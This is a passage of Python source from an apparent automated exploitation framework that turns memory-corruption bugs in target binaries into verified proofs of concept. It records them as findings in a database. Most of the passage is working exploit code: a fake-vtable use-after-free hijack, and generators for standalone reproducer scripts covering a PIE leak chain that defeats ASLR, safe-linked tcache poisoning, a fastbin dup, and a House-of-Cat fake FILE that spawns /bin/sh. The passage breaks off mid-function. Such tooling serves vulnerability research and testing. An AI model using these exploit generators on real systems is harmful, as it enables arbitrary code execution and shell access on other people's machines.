                       capture, alloc_info, send_idx=True, pad_to=None):
    """One pass of `_cpp_vtable_uaf` with the option selectors encoded at `width`, sending an
    index scalar after each selector only when `send_idx`.

    `pad_to` is the FIXED-WIDTH read length the crawl detected, and the fake vtable is filled to
    it. The blob was sized from the ALLOCATION, which is a different number: `new Derived()` asks
    for 40 bytes and the option that overwrites it does `read(0, obj, 48)`, so a 40-byte payload
    leaves that read eight bytes short -- it swallows the detonating option's own bytes and then
    waits for more, and the capture comes back "no fatal signal" on a sequence that works by hand
    **[measured]**. A fixed-width field has to be filled to its width or every later operation
    desyncs; `menu._fill` says the same thing about size-prefixed strings."""
    from ..fuzz import menu
    from . import exploit
    win_name, win_addr = win

    def _op(opt, idx=0):                                  # select `opt`, supply index `idx`
        sel = menu._scalar(opt.encode(), width)
        return sel + menu._scalar(str(idx).encode(), width) if send_idx else sel

    # Identify the allocating option(s) by tracing each candidate's drive once (cached).
    allocs: dict = {}
    for opt in cand:
        if ctx.should_cancel():
            return None
        addr, size = _trace_alloc(ctx, exe, alloc_info, _op(opt, 0), width, workdir)
        if addr:
            allocs[opt] = (addr, size or 32)
    if not allocs:
        return None

    attempts = 0
    for new_opt, (chunk, size) in allocs.items():
        size = max(16, min(size, 4096)) & ~0x7            # object size: edit read() consumes exactly
        size = max(size, int(pad_to or 0))                # ...but a fixed-width read wants its WIDTH
        # fake vtable built inline in the reclaimed object: ptr at off 0 -> chunk+8, slots all win
        vtable = _p64(chunk + 8) + _p64(win_addr) * ((size - 8) // 8)
        vtable = vtable[:size].ljust(size, b"\x00")
        benign = _p64(chunk + 8) + _p64(win_addr ^ 0xFFFF) * ((size - 8) // 8)
        benign = benign[:size].ljust(size, b"\x00")
        others = [o for o in cand if o != new_opt]
        for free_opt in others:
            for edit_opt in others:
                if edit_opt == free_opt:
                    continue
                for show_opt in others:
                    if show_opt in (free_opt, edit_opt) or ctx.should_cancel() or attempts >= 200:
                        if attempts >= 200:
                            return None
                        continue
                    attempts += 1
                    body = (_op(new_opt, 0) + _op(free_opt, 0)
                            + _op(edit_opt, 0) + vtable + _op(show_opt, 0))
                    if not exploit.reached(capture(body, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = (_op(new_opt, 0) + _op(free_opt, 0)
                           + _op(edit_opt, 0) + benign + _op(show_opt, 0))
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                          # reached without our vtable -> not ours
                    ctx.progress(msg=f"C++ UAF vtable hijack: new {new_opt}/free {free_opt}/edit "
                                     f"{edit_opt}/call {show_opt} -> fake vtable -> {win_name}")
                    return body, new_opt, free_opt, edit_opt, show_opt, chunk, size
    return None


def _attribution_proof(ctx, exe, seq, *, control=b"\n"):
    """Independently re-confirm a breakpoint-verified hijack by ATTRIBUTION: run the confirmed
    input under the write-attribution oracle and grade the win's output as coming from the
    target's OWN process subtree, present under the exploit and ABSENT under a benign control --
    a proof the old stdout-regex confirmation could not give (it credited any reflected string,
    or a helper that printed the banner itself). Best-effort: returns a proof dict or None, and
    never blocks the already breakpoint-confirmed L3."""
    try:
        from . import attribution as attr
        if exe is None or not attr.supported():
            return None
        helper = attr.materialize_helper()
        try:
            cap = attr.make_attributed_capture(ctx, helper, str(exe), "stdin", [], 8,
                                               sys.executable)
            res = cap(seq)
            if not isinstance(res, dict) or not res.get("ok"):
                return None
            ctrl = cap(control)
            ctrl = ctrl if isinstance(ctrl, dict) and ctrl.get("ok") else None
            lb = attr.lineage_bytes(res)
            cb = attr.lineage_bytes(ctrl) if ctrl else b""
            # a win banner / shell prompt (by shape) in an attributed write, absent under the
            # benign control -> the hijack ran, not a run-to-run artifact or a reflected string.
            win_lines = [ln for ln in lb.splitlines()
                         if _WIN_OUT.search(ln) and ln not in cb.splitlines()]
            g = attr.grade(res, win_tokens=win_lines, control=ctrl)
            return {"level": g["level"], "rank": g["rank"], "evidence": g["evidence"],
                    "attributed_bytes": g["attributed_bytes"]}
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)
    except Exception:
        observe.absorbed(_log, "answering None")
        return None


def _promote_lead(ctx, target, lead, *, level, bundle_sha, detail) -> None:
    """Carry the PoC back to the finding that LED to it.

    Every filer here writes a NEW finding for the exploit and leaves the lead where it was, so one
    defect reads as two unrelated rows: `Use-after-free -- corroborated` beside `Control-flow
    hijack (demonstrated)`, with nothing saying they are the same bug. Measured across 22 kept
    conformance stores, a chained lead stayed below poc-backed EVERY time -- 12/12 for
    `oob_index/CWE-129`, 5/5 for `heap_trace/CWE-416` -- which is a large part of what "a lot of
    potentials that dead end" actually is: the potential WAS carried, and its row was not updated.

    The lead keeps its own CWE, title and detector (it is still the defect that was found, and the
    detector that found it deserves the credit); what changes is that it becomes poc-backed, with
    the bundle as its proof and a line saying what the chain reached."""
    import json as _json

    from ...db.dao import FindingDAO
    try:
        FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
            "cwe": lead.cwe, "title": lead.title, "severity": "critical",
            "detector": lead.detector, "state": "poc-backed", "confidence": 0.99,
            "dedup_key": lead.dedup_key,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": f"Chained to {level}", "status": "demonstrated",
                "detail": detail,
                "proof": {"type": "bundle", "sha": bundle_sha, "note": detail}}])}]})
    except Exception:                                    # noqa: BLE001 -- never fail the filing
        observe.absorbed(_log, "leaving the lead's state alone")


def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, writer, off, trig,
             exe=None):
    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    proof = _attribution_proof(ctx, exe, seq)
    input_sha = ctx.put_artifact("chain-exploit-input", data=seq)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow", "offset": off, "target": win_name,
            "tool_version": TOOL_VERSION,
            "proof_level": (proof or {}).get("level", "breakpoint_only")}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(),
                        seq, meta, b"", "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working exploit ({vclass} -> control-flow hijack): {blame} to {win_name} "
           f"(0x{win_addr:x}); {trg} then calls it, arrival confirmed under the debugger with a "
           f"passing negative control.")
    if proof and proof["level"] in ("win_attributed", "code_exec_proven", "shell_proven"):
        eff += (f" Independently re-confirmed by attribution ({proof['level']}): the win output "
                "was emitted by the target's own process subtree, absent under a benign control.")
    attr_proof = {"attribution": proof} if proof else {}
    fd = FindingDAO(ctx.conn)
    cand = {
        "cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 working exploit",
        "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
        "confidence": 0.99, "authoritative": True, "title_only": True,
        "dedup_key": f"chain:{vclass}:{target.id}",
        "function_addr": None, "site_addr": None, "site_detail": win_name,
        "evidence": [{"channel": "effects", "detail": __import__("json").dumps([{
            "kind": "rce", "title": "Control-flow hijack", "status": "demonstrated", "detail": eff,
            "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                      "note": eff, **attr_proof}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "offset": off, "writer": writer, "trigger": trig,
             "bundle": bundle_sha, "proof_level": (proof or {}).get("level", "breakpoint_only")})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {win_name} (option {writer} +{off})")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}


def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes:
    """A self-contained, stdlib-based reproducer: leak -> recover the PIE base from the target's own
    symbols -> overwrite the code pointer with base+win_vaddr -> trigger. The base recovery mirrors
    exploit.recover_pie_base (page-offset match, >=2 corroborating leaked slots), so the PoC is a
    genuine ASLR defeat, not a hardcoded address."""
    trig_send = "" if trig is None else f"send({trig!r}+'\\n')\n"
    return (
        "#!/usr/bin/env python3\n"
        "# PIE leak-then-chain reproducer (stdlib based). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, struct, sys, time, collections\n"
        f"WIN_VADDR={win_vaddr:#x}; LEAK={leak_opt!r}; WRITER={writer!r}; OFF={off}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "def syms(path):\n"
        "  d=open(path,'rb').read(); a=collections.defaultdict(list)\n"
        "  is64=d[4]==2; e='<' if d[5]==1 else '>'\n"
        "  sh_off,=struct.unpack_from(e+'Q',d,0x28); shs,shn=struct.unpack_from(e+'HH',d,0x3a)\n"
        "  secs=[struct.unpack_from(e+'IIQQQQIIQQ',d,sh_off+i*shs) for i in range(shs and shn)]\n"
        "  for typ in (2,11):\n"
        "    for s in secs:\n"
        "      if s[1]!=typ or not s[9]: continue\n"
        "      st=secs[s[6]]; blob=d[st[4]:st[4]+st[5]]\n"
        "      for i in range(s[5]//s[9]):\n"
        "        o=s[4]+i*s[9]; info=d[o+4]; val,=struct.unpack_from(e+'Q',d,o+8)\n"
        "        t=info&0xf\n"
        "        if t in (1,2) and val: a[val&0xfff].append(val)\n"
        "    if a: break\n"
        "  return a\n"
        "def recover(vals, anchors):\n"
        "  sup=collections.defaultdict(set)\n"
        "  for v in vals:\n"
        "    if 0x1000<=v<=0x7fffffffffff:\n"
        "      for va in anchors.get(v&0xfff,()):\n"
        "        b=v-va\n"
        "        if b>0 and b&0xfff==0: sup[b].add(v)\n"
        "  best=max(sup, key=lambda b:len(sup[b]), default=None)\n"
        "  return best if best is not None and len(sup[best])>=2 else None\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "drain(); send(LEAK+'\\n'); out=drain()\n"
        "vals=[int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+',out)]\n"
        "base=recover(vals, syms(EXE))\n"
        "assert base, 'no base recovered from leak'\n"
        "send(WRITER+'\\n'); drain()\n"
        "send(b'A'*OFF+struct.pack('<Q',base+WIN_VADDR)); drain()\n"
        f"{trig_send}"
        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
    ).encode()


def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, writer, off, trig):
    """File a confirmed PIE leak-chain as an L3 verified PoC (bundle = target + a runnable
    leak-then-chain reproducer)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    script = _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig)
    input_sha = ctx.put_artifact("pie-chain-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow (PIE, leak-relocated)", "target": win_name,
            "win_vaddr": hex(win_vaddr), "leak_option": leak_opt, "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True, "note": "PIE leak-relocated"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working PIE exploit ({vclass} -> control-flow hijack): leaked a pointer via option "
           f"{leak_opt}, recovered the image base, then option {writer} overwrote an adjacent code "
           f"pointer at +{off} with base+{win_vaddr:#x} ({win_name}); {trg} ran it. Shown in "
           f"ONE process (a real ASLR defeat) and confirmed by the win's output under a passing "
           f"negative control (a corrupted address does not win).")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 PIE leak-chain",
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:pie:{target.id}", "site_detail": win_name,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": "Control-flow hijack (PIE, ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "leak": leak_opt, "writer": writer, "offset": off, "trigger": trig,
             "pie": True, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED (PIE): leak {leak_opt} -> base -> {win_name}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "pie": True, "off": off}}


def _heap_leak_repro_script(win_addr, roles, trig, target, safe) -> bytes:
    """A stdlib-only reproducer for the leak-consuming safe-linked tcache poison: alloc+free+view to
    read the live heap key, forge fd := key^target, alloc twice to land a chunk on target, write win
    there and trigger. Carries NO baked address but win's file vaddr (non-PIE) and `target`; the key
    is recovered from the target's own leak at run time, so the exploit survives heap ASLR."""
    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
    tg = "" if trig is None else f"send({trig!r}+'\\n'); send('3\\n')\n"
    editnum = "num" in (roles.get("edit_fields") or [])
    return (
        "#!/usr/bin/env python3\n"
        "# Safe-linked tcache-poison reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, struct, sys, time\n"
        f"WIN={win_addr:#x}; TARGET={target:#x}; SAFE={bool(safe)}; EDITNUM={bool(editnum)}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "def edit(idx,payload):\n"
        f"  send({edit!r}+'\\n'); send(str(idx)+'\\n')\n"
        "  if EDITNUM: send(str(len(payload))+'\\n')\n"
        "  send(payload); drain()\n"
        "drain()\n"
        # Free TWO same-size chunks (count stays >0 across both reclaiming mallocs); bin is [B,A]
        # LIFO, A the clean-fd tail we leak, B the head we poison.
        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 0 -- A
        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 1 -- B
        f"send({free!r}+'\\n'); send('0\\n'); drain()\n"               # free A -> A.fd == A>>12
        f"send({free!r}+'\\n'); send('1\\n'); drain()\n"               # free B -> bin [B,A]
        f"send({view!r}+'\\n'); out=send('0\\n') or drain()\n"         # UAF view of tail A -> key
        "cands=[int(x,16) for x in re.findall(rb'0x([0-9a-fA-F]{3,16})',out)]\n"
        "cands+=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
        "cands+=[int.from_bytes(ln[:8],'little') for ln in out.split(b'\\n') if ln]\n"
        "key=next((v for v in cands if 0x100<=v<(1<<36)), None)\n"
        "assert key is not None, 'no heap key disclosed by the UAF view'\n"
        "fd=(key^TARGET) if SAFE else TARGET\n"
        "edit(1, struct.pack('<Q',fd))\n"                              # poison the HEAD B's fd
        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 2 -- reclaims B
        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 3 -- ON target
        "edit(3, struct.pack('<Q',WIN))\n"                             # win over the code pointer
        f"{tg}"
        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
    ).encode()


def _file_heap_leak_l3(ctx, target, lead, vclass, win_name, win_addr, roles, trig, tgt, key, safe):
    """File a confirmed leak-consuming safe-linked tcache poison as an L3 verified PoC (bundle =
    target + a runnable leak-then-poison reproducer -- no static input can carry a runtime-leaked
    key)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    script = _heap_leak_repro_script(win_addr, roles, trig, tgt, safe)
    input_sha = ctx.put_artifact("heap-leak-chain-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow (safe-linked tcache poison, leak-relocated)",
            "target": win_name, "win_addr": hex(win_addr), "fnptr_target": hex(tgt),
            "leak_option": roles["view"], "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "fnptr_target": hex(tgt),
                                   "confirmed": True, "note": "safe-linked tcache poison, leak-relocated"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "normal use" if trig is None else f"menu option {trig}"
    sl = "safe-linked (glibc>=2.32)" if safe else "unmangled (pre-2.32)"
    eff = (f"working heap exploit ({vclass} -> control-flow hijack via {sl} tcache poisoning): "
           f"option {roles['view']}'s use-after-free view disclosed the freed chunk's fd -- the "
           f"heap key addr>>12 -- so the fd was forged to key^{tgt:#x}, two allocations landed a "
           f"chunk on the code pointer at {tgt:#x}, option {roles['edit']} wrote &{win_name} there, "
           f"and {trg} called it. Shown in ONE process (a real heap-ASLR defeat -- the key is the "
           f"live one, not a traced constant) and confirmed by the win's output under a passing "
           f"negative control (a corrupted fd does not win).")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": "Control-flow hijack (demonstrated): L3 safe-linked tcache poison (leak-relocated)",
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:heap-leak:{target.id}", "site_detail": win_name,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": "Control-flow hijack (safe-linked tcache poison, ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "leak": roles["view"], "edit": roles["edit"], "fnptr_target": hex(tgt),
             "trigger": trig, "safe_linking": safe, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED (heap): safe-linked tcache poison -> {win_name}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "heap_leak": True}}


def _fastbin_dup_repro_script(win_addr, roles, trig, target, req, safe) -> bytes:
    """A stdlib-only reproducer for the leak-consuming fastbin dup: fill the tcache so frees reach
    the fastbin, double-free a/b/a, drain the tcache, reallocate the dup and forge its fd to the
    fake-chunk target, land a chunk there, write win, trigger. Carries no baked address -- the key
    is recovered live, so it survives heap ASLR. The allocation indices match glibc's post-fastbin
    tcache stashing (measured on glibc 2.41)."""
    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
    cnt = _TCACHE_COUNT
    n_up = cnt + 2
    a_idx, b_idx = n_up - 2, n_up - 1
    d1 = n_up + cnt
    t_idx = d1 + 3
    editnum = "num" in (roles.get("edit_fields") or [])
    tg = "" if trig is None else f"send({trig!r}+'\\n'); send(str({t_idx})+'\\n')\n"
    return (
        "#!/usr/bin/env python3\n"
        "# Fastbin-dup reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, struct, sys, time\n"
        f"WIN={win_addr:#x}; TARGET={target:#x}; REQ={req}; SAFE={bool(safe)}; "
        f"EDITNUM={bool(editnum)}; CNT={cnt}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.3):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        f"def alloc(): send({add!r}+'\\n'); send(str(REQ)+'\\n'); drain()\n"
        f"def free(i): send({free!r}+'\\n'); send(str(i)+'\\n'); drain()\n"
        "def edit(i,payload):\n"
        f"  send({edit!r}+'\\n'); send(str(i)+'\\n')\n"
        "  if EDITNUM: send(str(len(payload))+'\\n')\n"
        "  send(payload); drain()\n"
        "drain()\n"
        f"for _ in range({n_up}): alloc()\n"                           # L + fillers + a + b
        "free(0)\n"                                                    # L -> tcache
        f"send({view!r}+'\\n'); out=send('0\\n') or drain()\n"         # UAF view -> key
        "cands=[int(x,16) for x in re.findall(rb'0x([0-9a-fA-F]{3,16})',out)]\n"
        "cands+=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
        "cands+=[int.from_bytes(ln[:8],'little') for ln in out.split(b'\\n') if ln]\n"
        "key=next((v for v in cands if 0x100<=v<(1<<36)), None)\n"
        "assert key is not None, 'no heap key disclosed'\n"
        "for i in range(1,CNT): free(i)\n"                             # fill tcache to cap
        f"free({a_idx}); free({b_idx}); free({a_idx})\n"               # fastbin dup a/b/a
        "for _ in range(CNT): alloc()\n"                               # drain tcache
        "alloc()\n"                                                    # d1 -- reclaims the dup head
        "fd=(key^TARGET) if SAFE else TARGET\n"
        f"edit({d1}, struct.pack('<Q',fd))\n"                          # forge the live dup's fd
        "alloc(); alloc()\n"                                           # consume stashed duplicates
        "alloc()\n"                                                    # lands ON target
        f"edit({t_idx}, struct.pack('<Q',WIN))\n"                      # win over the fake pointer
        f"{tg}"
        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
    ).encode()


def _file_fastbin_dup_l3(ctx, target, lead, vclass, win_name, win_addr, roles, trig, tgt, size,
                         req, key, safe):
    """File a confirmed leak-consuming fastbin dup as an L3 verified PoC (bundle = target + a
    runnable fastbin-dup reproducer; no static input can carry a runtime-leaked key)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    script = _fastbin_dup_repro_script(win_addr, roles, trig, tgt, req, safe)
    input_sha = ctx.put_artifact("fastbin-dup-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow (fastbin dup, leak-relocated)", "target": win_name,
            "win_addr": hex(win_addr), "fnptr_target": hex(tgt), "fake_chunk_size": hex(size),
            "leak_option": roles["view"], "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "fnptr_target": hex(tgt),
                                   "confirmed": True, "note": "fastbin dup, leak-relocated"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "normal use" if trig is None else f"menu option {trig}"
    eff = (f"working heap exploit ({vclass} -> control-flow hijack via a safe-linked FASTBIN DUP): "
           f"filled the tcache so frees reached the fastbin, double-freed a/b/a (the fasttop check "
           f"allows the non-adjacent repeat), recovered the heap key from option {roles['view']}'s "
           f"use-after-free view, reclaimed the dup'd chunk and forged its fd to key^{tgt:#x} so a "
           f"later allocation landed on the fake chunk at {tgt:#x} (size {size:#x}, a valid fastbin "
           f"header), option {roles['edit']} wrote &{win_name} there, and {trg} called it. Shown in "
           f"ONE process (a real heap-ASLR defeat) and confirmed by the win's output under a passing "
           f"negative control (a corrupted fd does not win).")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": "Control-flow hijack (demonstrated): L3 fastbin dup (leak-relocated)",
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:fastbin-dup:{target.id}", "site_detail": win_name,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": "Control-flow hijack (fastbin dup, ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "technique": "fastbin-dup", "fnptr_target": hex(tgt),
             "trigger": trig, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED (heap): fastbin dup -> {win_name}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "fastbin_dup": True}}


def _house_of_cat_repro_script(roles, uoff, cat, exit_seqs, blob_gap) -> bytes:
    """A stdlib-only reproducer for the no-win House-of-Cat shell. Bakes the libc-version-specific
    offsets (so no libc is needed at run time), recovers the base from the unsorted-bin leak, builds
    the fake FILE for the "system" plan inline (House-of-Cat field offsets), poisons `_IO_list_all`
    and triggers. Rebuilds the blob without importing lykos (`heap.cat_offsets` documents the
    layout)."""
    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
    exitseq = (exit_seqs or [b"q\n"])[0].decode("latin1")
    editnum = "num" in (roles.get("edit_fields") or [])
    return (
        "#!/usr/bin/env python3\n"
        "# House-of-Cat no-win FSOP shell reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, struct, sys, time\n"
        f"UOFF={uoff:#x}; LIST_ALL={cat['list_all']:#x}; WFJ={cat['wfile_jumps']:#x}; "
        f"SYS={cat['system']:#x}\n"
        f"BIG={_HOC_BIG}; GUARD={_HOC_GUARD}; SMALL={_HOC_SMALL}; BLOB_GAP={blob_gap:#x}; "
        f"EDITNUM={bool(editnum)}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.3):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        f"def alloc(sz): send({add!r}+'\\n'); send(str(sz)+'\\n'); drain()\n"
        f"def free(i): send({free!r}+'\\n'); send(str(i)+'\\n'); drain()\n"
        f"def view(i): send({view!r}+'\\n'); send(str(i)+'\\n'); return drain()\n"
        "def edit(i,payload):\n"
        f"  send({edit!r}+'\\n'); send(str(i)+'\\n')\n"
        "  if EDITNUM: send(str(len(payload))+'\\n')\n"
        "  send(payload); drain()\n"
        "def cat_blob(file_addr):\n"                       # the "system"-plan fake FILE, built inline
        "  b=bytearray(0x390)\n"
        "  def w(o,v): b[o:o+8]=struct.pack('<Q',v & 0xFFFFFFFFFFFFFFFF)\n"
        "  b[0:8]=(b' /bin/sh'+b'\\x00'*8)[:8]\n"           # _flags doubles as the command
        "  w(0x88, file_addr+0x380); w(0x300+0x68, BASE+SYS); w(0x68, 0)\n"
